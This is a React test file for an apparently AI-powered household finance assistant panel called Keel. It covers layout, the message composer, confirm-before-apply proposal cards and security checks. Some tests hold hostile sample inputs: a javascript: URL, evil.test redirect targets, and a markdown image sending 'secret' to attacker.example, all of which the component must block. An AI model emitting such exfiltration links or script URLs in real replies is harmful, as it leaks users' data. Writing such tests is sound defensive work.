import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { SetupState } from '@/lib/keel/types'

let pathname = '/financial-profile'
let authUser: { id: string } | null = { id: 'u1' }
const confirmProposal = vi.fn()
const dismissProposal = vi.fn()
const fetchSetupState = vi.fn()
const streamTurn = vi.fn()

vi.mock('next/navigation', () => ({
  usePathname: () => pathname,
  useRouter: () => ({ push: vi.fn() }),
}))
vi.mock('@/lib/auth-context', () => ({ useAuth: () => ({ user: authUser }) }))
vi.mock('@/lib/mode-context', () => ({ useMode: () => ({ config: { showMoney: true } }) }))
vi.mock('@/components/Disclaimer', () => ({ DisclaimerFooter: () => null }))
vi.mock('@/components/LifeSafetyNotice', () => ({
  LifeSafetyNotice: () => <div>safety notice</div>,
}))
vi.mock('@/lib/keel/client', async (orig) => ({
  ...(await orig<typeof import('@/lib/keel/client')>()),
  confirmProposal: (...a: unknown[]) => confirmProposal(...a),
  dismissProposal: (...a: unknown[]) => dismissProposal(...a),
  fetchSetupState: (...a: unknown[]) => fetchSetupState(...a),
  streamTurn: (...a: unknown[]) => streamTurn(...a),
}))
vi.mock('@/lib/onDeviceLlm', () => ({
  redactForCloudEgressAsync: async (t: string) => ({
    redactedText: t,
    restore: (x: string) => x,
    hasSpecialCategoryHint: false,
  }),
}))
vi.mock('@/lib/on-device-ner', () => ({ classifyEntities: vi.fn() }))

import { KeelDock } from '../KeelDock'
import { KeelFullPage } from '../KeelFullPage'
import { NavChip, Proposal, SetupChecklist } from '../KeelCards'
import { useKeelPanel } from '@/lib/keel/store'

const setup = (over: Partial<SetupState> = {}): SetupState => ({
  bootstrap: false,
  role: 'organizer',
  completed: 4,
  total: 11,
  verified_complete: false,
  next_step_id: 'protection_on_file',
  data_as_of: '2026-10-28T10:00:00Z',
  steps: [
    {
      id: 'household_created',
      title: 'Create your household',
      status: 'done',
      route_key: 'family',
      est_minutes: 2,
      can_act: true,
    },
    {
      id: 'protection_on_file',
      title: 'Record the protection you already have',
      status: 'partial',
      route_key: 'financial-profile.protection',
      anchor: 'policies',
      est_minutes: 3,
      can_act: true,
    },
    {
      id: 'notifications_configured',
      title: 'Choose how Keel keeps you posted',
      status: 'blocked',
      route_key: 'settings.notifications',
      est_minutes: 2,
      can_act: false,
      hint: 'Your household organizer can do this.',
    },
  ],
  ...over,
})

function setViewport(width: number, rail = true) {
  Object.defineProperty(window, 'innerWidth', { configurable: true, value: width })
  window.matchMedia = ((q: string) => ({
    matches: rail && q.includes('min-width: 1024px'),
    media: q,
    addEventListener() {},
    removeEventListener() {},
    addListener() {},
    removeListener() {},
    onchange: null,
    dispatchEvent: () => true,
  })) as typeof window.matchMedia
}

beforeEach(() => {
  pathname = '/financial-profile'
  authUser = { id: 'u1' }
  setViewport(1440)
  fetchSetupState.mockResolvedValue(setup())
  streamTurn.mockReset()
  confirmProposal.mockReset()
  dismissProposal.mockReset()
  useKeelPanel.getState().resetIdentity(null)
  useKeelPanel.setState({
    identity: 'u1',
    identityGen: 1,
    open: false,
    minimised: false,
    greeted: false,
  })
  sessionStorage.clear()
})
afterEach(cleanup)

const open = async () => {
  render(<KeelDock eligible />)
  act(() => useKeelPanel.getState().openPanel())
  await screen.findByLabelText('Keel assistant')
}

describe('KeelDock', () => {
  it('renders nothing while closed and does not navigate when opened', async () => {
    const { container } = render(<KeelDock eligible />)
    expect(container.innerHTML).toBe('')
    act(() => useKeelPanel.getState().openPanel())
    expect(await screen.findByLabelText('Keel assistant')).toBeTruthy()
    expect(pathname).toBe('/financial-profile')
  })

  it('wide screens dock it as a complementary region and push the page', async () => {
    await open()
    const panel = screen.getByLabelText('Keel assistant')
    expect(panel.tagName).toBe('ASIDE')
    expect(panel.hasAttribute('aria-modal')).toBe(false)
    expect(document.documentElement.style.getPropertyValue('--keel-panel-w')).toBe('400px')
    expect(screen.getByRole('separator', { name: /resize/i })).toBeTruthy()
  })

  it('phones get a modal dialog, the page behind becomes inert, and SOS is inside the chrome', async () => {
    setViewport(390, false)
    document.body.innerHTML = '<div id="main-content"></div>'
    const onEmergency = vi.fn()
    render(<KeelDock eligible onEmergency={onEmergency} />, {
      container: document.body.appendChild(document.createElement('div')),
    })
    act(() => useKeelPanel.getState().openPanel())
    const dialog = await screen.findByRole('dialog', { name: 'Keel assistant' })
    expect(dialog.getAttribute('aria-modal')).toBe('true')
    expect(document.getElementById('main-content')!.hasAttribute('inert')).toBe(true)
    expect(document.documentElement.style.getPropertyValue('--keel-panel-w')).toBe('0px')
    fireEvent.click(within(dialog).getByRole('button', { name: 'Emergency help' }))
    expect(onEmergency).toHaveBeenCalled()
    fireEvent.click(within(dialog).getByRole('button', { name: 'Minimise Keel' }))
    expect((await screen.findByRole('button', { name: 'Resume Keel' })).textContent).toMatch(
      'Step 4 of 11',
    )
    expect(document.getElementById('main-content')!.hasAttribute('inert')).toBe(false)
  })

  it('shows the setup summary and a once-per-session greeting naming the next step', async () => {
    await open()
    expect((await screen.findByTestId('setup-summary')).textContent).toMatch('Setup 4 of 11')
    expect(screen.getByTestId('setup-summary').textContent).toMatch(
      'Record the protection you already have',
    )
    await waitFor(() => expect(screen.getAllByText(/finished/i).length).toBeGreaterThan(0))
    expect(useKeelPanel.getState().messages).toHaveLength(1)
    expect(useKeelPanel.getState().greeted).toBe(true)
  })

  it('Escape closes it; Ctrl+J toggles it', async () => {
    await open()
    fireEvent.keyDown(screen.getByLabelText('Keel assistant'), { key: 'Escape' })
    await waitFor(() => expect(useKeelPanel.getState().open).toBe(false))
    fireEvent.keyDown(window, { key: 'j', ctrlKey: true })
    expect(useKeelPanel.getState().open).toBe(true)
    fireEvent.keyDown(window, { key: 'j', metaKey: true })
    expect(useKeelPanel.getState().open).toBe(false)
  })

  it('stays mounted with its conversation across a route change', async () => {
    const view = render(<KeelDock eligible />)
    act(() => {
      useKeelPanel.getState().openPanel()
      useKeelPanel.getState().appendLocal({ role: 'keel', content: 'Kept across pages', cards: [] })
    })
    expect(await screen.findByText('Kept across pages')).toBeTruthy()
    pathname = '/documents'
    view.rerender(<KeelDock eligible />)
    expect(screen.getByText('Kept across pages')).toBeTruthy()
    expect(useKeelPanel.getState().pageContext.route).toBe('/documents')
  })

  it('signing out hides it and clears the conversation', async () => {
    const view = render(<KeelDock eligible />)
    act(() => {
      useKeelPanel.getState().openPanel()
      useKeelPanel.getState().appendLocal({ role: 'keel', content: 'Private to u1', cards: [] })
    })
    await screen.findByText('Private to u1')
    authUser = null
    view.rerender(<KeelDock eligible={false} />)
    await waitFor(() => expect(screen.queryByText('Private to u1')).toBeNull())
    expect(useKeelPanel.getState().messages).toEqual([])
  })

  it('is not rendered for an ineligible page (public, operator)', () => {
    useKeelPanel.setState({ open: true })
    const { container } = render(<KeelDock eligible={false} />)
    expect(container.innerHTML).toBe('')
  })

  it('is not rendered on /assistant, where the same conversation is the page', () => {
    pathname = '/assistant'
    useKeelPanel.setState({ open: true })
    const { container } = render(<KeelDock eligible />)
    expect(container.innerHTML).toBe('')
  })

  it('a child-role setup state shows no summary', async () => {
    fetchSetupState.mockResolvedValue(setup({ role: 'child', steps: [], total: 0, completed: 0 }))
    await open()
    await waitFor(() => expect(useKeelPanel.getState().setup?.role).toBe('child'))
    expect(screen.queryByTestId('setup-summary')).toBeNull()
  })
})

describe('composer', () => {
  beforeEach(() => {
    streamTurn.mockImplementation(async () => {})
  })

  it('Enter sends, Shift+Enter does not, and IME composition never sends', async () => {
    await open()
    const box = screen.getByLabelText('Ask Keel a question')
    fireEvent.change(box, { target: { value: 'hello' } })
    fireEvent.keyDown(box, { key: 'Enter', shiftKey: true })
    expect(streamTurn).not.toHaveBeenCalled()
    fireEvent.compositionStart(box)
    fireEvent.keyDown(box, { key: 'Enter' })
    expect(streamTurn).not.toHaveBeenCalled()
    fireEvent.compositionEnd(box)
    fireEvent.keyDown(box, { key: 'Enter' })
    await waitFor(() => expect(streamTurn).toHaveBeenCalledOnce())
    expect(useKeelPanel.getState().draft).toBe('')
  })

  it('the draft survives a route change', async () => {
    const view = render(<KeelDock eligible />)
    act(() => useKeelPanel.getState().openPanel())
    fireEvent.change(await screen.findByLabelText('Ask Keel a question'), {
      target: { value: 'half typed' },
    })
    pathname = '/family'
    view.rerender(<KeelDock eligible />)
    expect((screen.getByLabelText('Ask Keel a question') as HTMLTextAreaElement).value).toBe(
      'half typed',
    )
  })

  it('shows Stop while a reply is pending and Stop cancels it', async () => {
    streamTurn.mockImplementation(() => new Promise<void>(() => {}))
    await open()
    fireEvent.change(screen.getByLabelText('Ask Keel a question'), { target: { value: 'hello' } })
    fireEvent.click(screen.getByRole('button', { name: 'Send message' }))
    fireEvent.click(await screen.findByRole('button', { name: 'Stop' }))
    expect(useKeelPanel.getState().sending).toBe(false)
    expect(useKeelPanel.getState().messages.some((m) => m.pending)).toBe(false)
  })
})

describe('cards', () => {
  it('a nav chip is a real link for a known key, and renders nothing for an unknown or hostile one', () => {
    const { rerender, container } = render(
      <NavChip card={{ kind: 'navigate', route_key: 'upload', label: 'Open: Upload' }} />,
    )
    expect(screen.getByRole('link', { name: /Open: Upload/ }).getAttribute('href')).toBe('/upload')
    for (const bad of ['https://evil.test', 'javascript:alert(1)', '//evil.test', 'nope']) {
      rerender(<NavChip card={{ kind: 'navigate', route_key: bad, label: 'Click' }} />)
      expect(container.innerHTML).toBe('')
    }
  })

  it('a nav chip calls onNavigate and asks to spotlight its anchor', () => {
    document.body.innerHTML = ''
    const onNavigate = vi.fn()
    render(
      <NavChip
        card={{
          kind: 'navigate',
          route_key: 'financial-profile.protection',
          label: 'Open',
          anchor: 'policies',
        }}
        onNavigate={onNavigate}
      />,
    )
    fireEvent.click(screen.getByRole('link'))
    expect(onNavigate).toHaveBeenCalledOnce()
  })

  it('the checklist leads with up to three open steps, labels status in words, and expands', () => {
    const steps = [
      ...['a', 'b', 'c', 'd'].map((id) => ({
        id,
        title: `Step ${id}`,
        status: 'not_started' as const,
        route_key: 'family',
      })),
      { id: 'e', title: 'Done step', status: 'done' as const, route_key: 'family' },
      {
        id: 'f',
        title: 'Org only',
        status: 'blocked' as const,
        route_key: 'family',
        hint: 'Your household organizer can do this.',
      },
    ]
    render(
      <SetupChecklist
        card={{
          kind: 'setup_checklist',
          completed: 1,
          total: 6,
          verified_complete: false,
          next_step_id: 'a',
          steps,
        }}
      />,
    )
    expect(screen.getAllByRole('listitem')).toHaveLength(3)
    expect(screen.queryByText('Done step')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: 'View setup' }))
    expect(screen.getAllByRole('listitem')).toHaveLength(6)
    expect(screen.getByText(/· Done/)).toBeTruthy()
    expect(screen.getByText('Your household organizer can do this.')).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Show less' }).getAttribute('aria-expanded')).toBe(
      'true',
    )
  })

  const card = {
    kind: 'proposal' as const,
    proposal_id: 'p1',
    title: 'Notification settings for this setup',
    changes: [{ key: 'digest_mode', label: 'Digest of routine updates', from: 'Off', to: 'On' }],
    expires_at: '2099-01-01T00:00:00Z',
  }

  it('a proposal changes nothing until Apply is pressed, then reports success and refreshes setup', async () => {
    confirmProposal.mockResolvedValue('applied')
    const onApplied = vi.fn()
    render(<Proposal card={card} onApplied={onApplied} />)
    expect(confirmProposal).not.toHaveBeenCalled()
    expect(screen.getByText('On')).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: 'Apply these settings' }))
    expect((await screen.findByRole('status')).textContent).toMatch('Done')
    expect(confirmProposal).toHaveBeenCalledWith('p1')
    expect(onApplied).toHaveBeenCalledOnce()
    expect(screen.queryByRole('button', { name: 'Apply these settings' })).toBeNull()
  })

  it.each([
    ['conflict', /changed since/],
    ['forbidden', /Only the household organizer/],
    ['failed', /Nothing was changed/],
    ['gone', /no longer available/],
  ] as const)('a %s outcome is explained honestly', async (outcome, text) => {
    confirmProposal.mockResolvedValue(outcome)
    render(<Proposal card={card} />)
    fireEvent.click(screen.getByRole('button', { name: 'Apply these settings' }))
    expect((await screen.findByRole('status')).textContent).toMatch(text)
  })

  it('a card reloaded from history after its 15 minutes offers no Apply button', () => {
    render(<Proposal card={{ ...card, expires_at: '2020-01-01T00:00:00Z' }} />)
    expect(screen.queryByRole('button', { name: 'Apply these settings' })).toBeNull()
    expect(screen.getByRole('status').textContent).toMatch(/no longer available/)
  })

  it('"Not now" dismisses without applying', async () => {
    dismissProposal.mockResolvedValue(true)
    render(<Proposal card={card} />)
    fireEvent.click(screen.getByRole('button', { name: 'Not now' }))
    expect((await screen.findByRole('status')).textContent).toMatch('nothing was changed')
    expect(confirmProposal).not.toHaveBeenCalled()
  })
})

describe('full-page view', () => {
  it('prefills a ?prompt= hint but never sends it', async () => {
    window.history.pushState(
      {},
      '',
      '/assistant?context=/family&prompt=What%20should%20I%20do%20next%3F',
    )
    render(<KeelFullPage />)
    await waitFor(() =>
      expect((screen.getByLabelText('Ask Keel a question') as HTMLTextAreaElement).value).toBe(
        'What should I do next?',
      ),
    )
    expect(streamTurn).not.toHaveBeenCalled()
    expect(useKeelPanel.getState().pageContext.route).toBe('/family')
  })

  it('rejects a context hint that is not a plain in-app path', async () => {
    window.history.pushState({}, '', '/assistant?context=https://evil.test/x')
    render(<KeelFullPage />)
    await waitFor(() => expect(fetchSetupState).toHaveBeenCalled())
    expect(useKeelPanel.getState().pageContext.route).not.toContain('evil')
  })
})

describe('model text', () => {
  it('never loads a remote image, whatever the reply contains', async () => {
    await open()
    act(() =>
      useKeelPanel.getState().appendLocal({
        role: 'keel',
        content: 'Here ![x](https://attacker.example/p?d=secret) and [a link](https://example.com)',
        cards: [],
      }),
    )
    await screen.findByText(/Here/)
    expect(document.querySelector('img')).toBeNull()
  })
})
